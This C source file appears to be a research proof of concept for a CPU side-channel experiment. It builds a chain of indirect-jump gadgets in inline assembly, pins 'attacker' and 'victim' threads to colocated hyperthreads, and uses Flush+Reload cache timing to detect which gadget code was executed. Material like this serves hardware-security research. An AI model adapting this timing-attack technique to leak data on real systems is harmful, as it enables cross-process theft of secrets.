#define _GNU_SOURCE
#include "config.h"
#include <assert.h>
#include <stdio.h>
#include <x86intrin.h>
#include "flush_reload.c"
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>  
#include <pthread.h>
#include <sys/mman.h>

#define VERIFY(x, errmsg)               \
    if(!((x))){                         \
        fprintf(stderr, "%s:%d>>\n\t",  \
                __func__, __LINE__);    \
        perror(errmsg);                 \
        exit(1);                        \
    }


#define xstr(s) str(s)
#define str(s) #s

int debrujn[] = {0, 2, 13, 4, 10, 14, 6, 3, 5, 11, 7, 9, 1, 12, 8, 15};

void pin(unsigned core) { 
    cpu_set_t cpuset;

    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);

  VERIFY(sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0,
           "Unable to pin thread");
}

extern void gadget_start(void);
extern void gadget_end(void);
#pragma GCC optimize ("O3")
void __attribute__((naked,noinline))
gadget(void *p, unsigned *count, volatile void *base) {
/* rdi holds pointers */
    asm(
        ".global gadget_start;"
        "gadget_start:"
        ".rept " xstr(N_BRANCHES) ";"
        // Nop to make the length of each rept odd (29)
        "nop;"
        // Access counter
        "incl (%rsi);"
        // Access FR page
        "movq (%rdx), %rcx;"
        "add $"xstr(BLOCK_SIZE) ", %rdx;"
        // Sequence of jumps
        "movq 0x0(%rdi), %r8;"
        "add $8, %rdi;"
        "jmp *%r8;"
        ".rept 4096; nop; .endr;"
        ".endr;"
        ".global gadget_end;"
        "gadget_end:"
        "ret;"
    );
}

/* At least as many pointers as jumps later */
uintptr_t pointers[N_BRANCHES];
volatile int common_counter = 0;
typedef struct  {
    void *jumps;
    void *flush_ptr;
    volatile void *reload_ptr;
    unsigned core;
} args_t;


void *routine(void *argsv) {
    args_t *args = (args_t *)argsv;
    void *jmp_ptrd = args->jumps;
    void *flush_ptr = args->flush_ptr;
    volatile void *reload_ptr = args->reload_ptr;
    unsigned core = args->core;

    pin(core);

    unsigned count = 0;
    if(common_counter == 0) {
    _mm_clflush(flush_ptr);
    gadget(jmp_ptrd, &count, reload_ptr);
    }
    // printf("Done %u\n", count);
} 

void main(int argc, char **argv) {
    bool accessed[MAX_VAL + 1];

    uintptr_t gadgets_size = (uintptr_t) gadget_end - (uintptr_t) gadget_start;
    assert(gadgets_size % N_BRANCHES == 0);
    uintptr_t sizeof_gadget_rep = gadgets_size / N_BRANCHES;
    // printf("Each gadget iteration is %ld bytes long\n", sizeof_gadget_rep);
#ifdef HUGE_INST
    unsigned size = (((uintptr_t)gadget_start & ~0x1fffff) == ((uintptr_t)gadget_end & ~0x1fffff))? 1 << 21 : 1 << 22;
    void *hugepage = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    assert(hugepage != MAP_FAILED);
    void *gadget_start_huge = (void *)((uintptr_t)hugepage + ((uintptr_t)gadget_start & 0x1fffff));
    memcpy(gadget_start_huge, gadget_start, gadgets_size + 1);
    int ret = mprotect(hugepage, size, PROT_READ | PROT_EXEC);
    assert(ret == 0);

    for(int i = 0; i < N_BRANCHES; i++)
        pointers[i] = ((uintptr_t)gadget_start_huge) + (debrujn[i] + 1) * sizeof_gadget_rep;
#else
    for(int i = 0; i < N_BRANCHES; i++)
        pointers[i] = ((uintptr_t)&gadget_start) + (debrujn[i] + 1) * sizeof_gadget_rep;
#endif


    volatile char *FR_array_effective = FR_init();
    uintptr_t gadget_addr = ((uintptr_t)&gadget_end);
    args_t args_victim = {
        .jumps = &gadget_addr,
        .flush_ptr = &gadget_addr,
        .reload_ptr = FR_array_effective,
        .core = CORE0
    };
    args_t args_attacker = {
        .jumps = pointers,
        .flush_ptr = &gadget_addr,
        .reload_ptr = FR_array_effective + ((MAX_VAL + 1) * BLOCK_SIZE / 2),
        .core = CORE1
    };

    pthread_t attacker_th;
    FR_flush();
    /* Attacker and victim run `routine` on colocated hyperthreads */
    pthread_create(&attacker_th, NULL, routine, &args_attacker);
    routine(&args_victim);
    FR_reload(accessed, 0);

    pthread_join(attacker_th, NULL);
}
